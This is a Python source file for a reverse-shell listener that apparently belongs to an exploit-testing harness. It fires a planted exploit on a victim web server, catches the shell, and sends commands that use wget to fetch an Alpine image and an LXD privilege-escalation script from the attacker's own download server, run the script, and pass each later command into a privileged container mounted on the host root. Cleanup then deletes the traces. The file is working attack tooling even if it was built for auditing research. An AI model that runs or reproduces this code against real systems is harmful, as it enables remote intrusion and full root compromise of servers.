import socket, sys, time, os, requests, datetime, re, random, errno
import threading

# DISCLAIMER
# I utilized as base code for this listener the code found on:
# https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html

def listen(ip,port, t2, r_port, file_name, general_info):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	print("Listening on port " + str(port))
	con = None
	conn, addr = s.accept()
	print('Connection received from ',addr)
	print('=================================================')
	print('=                Reverse Shell                  =')
	print('=================================================')
	print('$', end=" ") # The shell does not print the first $, so in order not to confuse the user I decided to print it
	try:
		
		t2.start() # This threads will be daemon, however they will close once the main thread closes, so we don't run into the problem of keeping it always on
		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
		print('[+] Waiting for connection')
		time.sleep(0.5)
		print('[DEBBUG] wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name))
		print('[DEBBUG] wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port))
		
		start = "\n"
		# Use the own victim command line to inform the logging server instead of creating a request
		if general_info['active'] == 'True':
			start = 'wget \'' + informAudittingStart(general_info) + '\'"$(echo $$)"' + ' -O /dev/null\n'
		print('[DEBBUG]', general_info['active'], type(general_info['active']))
		print('[DEBBUG]', general_info['active'] == 'True', general_info['active'] == "True", general_info['active'] == 'True' +"")
		print('[DEBBUG]', start)
			
		commands = [start, '''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
''','wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] 
		for cmd in commands:
			ans = recvall(conn)
			sys.stdout.write(ans)
			conn.send(cmd.encode())
			time.sleep(0.2)
			sys.stdout.write("\033[A" + ans.split("\n")[-1])
		print('''
		
		################################################################
		#							       #
		#                       Explanation			       #
		#							       #
		################################################################
		
		In order to have the concept of session, make compound commands.
		Example, if you wanted to list the contents of /tmp
		cd /tmp && ls -la
		
		Otherwise if you type:
		cd /tmp
		ls -la
		
		It will list the contents of directory you were when executing cd /tmp
		''')
		
		while True:
			#Receive data from the target and get user input

			ans = recvall(conn)
			sys.stdout.write(ans)
			command = input()

			# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
			# cd /mnt/root is always forced because the filesystem was mounted at this point, that way the user will always be poiting to the root
			# Since we between commands we lose the concept of session, its always force so we can start from the exact same point
			
			
			if command != "":
				command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
			
			command += '\n'
			conn.send(command.encode())
			time.sleep(0.4)
			sys.stdout.write("\033[A" + ans.split("\n")[-1])
			print("")
	except KeyboardInterrupt:
		if conn:
			print('\n[-] Unbinding...')
			# Cleanup
			cleanup(conn, file_name, general_info)
			time.sleep(0.2)
			conn.close()
			s.close()
	conn.close()
        
def listen_shell(ip, port, v_ip, v_port, general_info):
	r_port = random.randint(1024, 65536)
	# Making sure the random port is not in use
	while check_port(ip, r_port):
		r_port = random.randint(1024, 65536)
		
	t1 = threading.Thread(target=task, args=(v_ip, v_port))
	t2 = threading.Thread(target=task2, args=(ip, r_port))
	t1.start()
	listen(ip, int(port), t2, r_port, get_file_name(), general_info)
	
def task(v_ip, v_port):

	time.sleep(1)
	now = datetime.datetime.now()
	print('[*] Executing Thread for HTTP Request')
	if os.path.exists('./tmp_file_with_dest_url.txt'):
		f = open('./tmp_file_with_dest_url.txt', 'r')
		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
		f.close()
		print('[*] Making request to execute reverse shell ', url)
		# Make the timeout very low in order not to wait for response
		# Make the exception pass so that the user does not get an error 
		try:
	    		requests.get(url, timeout=(1, 1))
		except requests.exceptions.ReadTimeout:
	    		pass
		except requests.exceptions.ConnectTimeout:
	    		sys.exit('[-] We couldn\'t find the exploit in the victim server, check if the server is alive')
	    		 
		os.remove('./tmp_file_with_dest_url.txt')
		print('[*] The exact time before lauching the exploit was: ', now)
		print('[*] You can use this time to help you filter the syscall logs')
		

	else:
		print('[-] URL wasn\'t generated, you might need to run the exploit another time')
		print('[-] If the problem persists, please confirm the information you passed')
		
		sys.exit()
		
# This will invoke the a server to download files, used to pass both the exploit and the tar.gz file
def task2(ip, r_port):
	os.system('python3 ./Privilege_Escalation_LXD/file_download_server.py {r_port}'.format(r_port=r_port))
	
def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
	
def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		  
		# if match is found
		if match:
			return file
			
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = ''
    while True:
        part = sock.recv(BUFF_SIZE).decode()
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data


def cleanup(conn, file_name, general_info):
	conn.send('rm -f *.tar.gz exploit.sh; lxc delete privesc --force;'.encode())
	print('[DEBBUG] ' + 'wget -O /dev/null \'' + informAudittingStop(general_info) + '\'"$(ps aux | grep www-data | grep "sh -i" | awk \'{print $2 }\' | sed -n 2p)"')
	try:
		requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
	except requests.exceptions.ReadTimeout:
	    		pass
	except requests.exceptions.ConnectTimeout:
	    	sys.exit('[-] Failed to connect to Logging server')
	if os.path.exists(file_name):
		os.remove(file_name)
	if os.path.exists('build-alpine'):
		os.remove('build-alpine')


def informAudittingStart(general_info):
	exploit = 'LXD'
	# Pid is added on the terminal using $(echo $$)
	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit + '&pid='
	return url

def informAudittingStop(general_info):
	exploit = 'LXD'
	# Pid is added on the terminal using $(echo $$)
	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit + '&pid='
	return url


		
